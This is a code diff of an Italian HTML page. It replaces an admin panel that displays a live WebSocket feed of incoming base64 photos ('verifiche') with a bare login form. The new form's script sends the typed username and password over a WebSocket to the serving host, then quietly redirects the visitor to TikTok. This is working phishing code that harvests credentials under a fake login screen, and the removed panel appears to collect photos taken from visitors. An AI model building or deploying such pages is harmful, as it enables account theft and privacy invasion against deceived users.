@@ -2,58 +2,74 @@
 <html lang="it">
 <head>
   <meta charset="utf-8">
-  <title>Admin – Verifiche</title>
+  <title>Login</title>
+  <link rel="stylesheet" href="style.css">
   <style>
-    body { font-family:Arial; background:#f0f0f0; padding:20px; margin:0; }
-    h1 { text-align:center; }
-    #feed { max-width:900px; margin:0 auto; }
-    .user-box { background:white; border-radius:8px; padding:15px; margin:20px 0; box-shadow:0 2px 10px rgba(0,0,0,0.1); }
-    img { width:100%; max-width:600px; border-radius:6px; }
-    button { padding:10px 20px; font-size:16px; margin:10px 5px; cursor:pointer; }
-    #saveBtn { background:#28a745; color:white; border:none; }
-    #stopBtn { background:#dc3545; color:white; border:none; }
+    body {
+      font-family: Arial;
+      background: #f2f2f2;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    #box {
+      background: white;
+      padding: 25px;
+      border-radius: 12px;
+      width: 300px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.15);
+      text-align: center;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #007bff;
+      border: none;
+      color: white;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+    }
   </style>
 </head>
 <body>
-<h1>Verifiche in arrivo</h1>
-<div id="feed"></div>
+
+<div id="box">
+  <h2>Login</h2>
+
+  <input id="user" placeholder="Username">
+  <input id="pass" placeholder="Password" type="password">
+
+  <button id="enter">ENTER</button>
+</div>
 
 <script>
-  const ws = new WebSocket((location.protocol === 'https:' ? 'wss:' : 'ws:') + location.host);
-  let currentImg = null;
+  const ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host);
 
-  ws.onopen = () => console.log('Connesso');
+  document.getElementById("enter").onclick = () => {
+    const u = document.getElementById("user").value;
+    const p = document.getElementById("pass").value;
 
-  ws.onmessage = (event) => {
-    if (typeof event.data === 'string') {
-      const box = document.createElement('div');
-      box.className = 'user-box';
+    ws.send(JSON.stringify({
+      user: u,
+      message: p
+    }));
 
-      currentImg = document.createElement('img');
-      currentImg.src = event.data; // base64
-      box.appendChild(currentImg);
-
-      const saveBtn = document.createElement('button');
-      saveBtn.textContent = 'Salva Foto Completa';
-      saveBtn.onclick = () => {
-        const a = document.createElement('a');
-        a.href = currentImg.src;
-        a.download = `verifica_${Date.now()}.jpg`;
-        a.click();
-      };
-      box.appendChild(saveBtn);
-
-      const stopBtn = document.createElement('button');
-      stopBtn.textContent = 'Ferma e Salva';
-      stopBtn.onclick = () => {
-        ws.send(JSON.stringify({ type: 'stop' }));
-        saveBtn.click();
-      };
-      box.appendChild(stopBtn);
-
-      document.getElementById('feed').prepend(box); // aggiungi in alto per feed live
-    }
+    // Redirect a TikTok dopo l'invio
+    setTimeout(() => {
+      window.location.href = "https://www.tiktok.com";
+    }, 300);
   };
 </script>
+
 </body>
 </html>
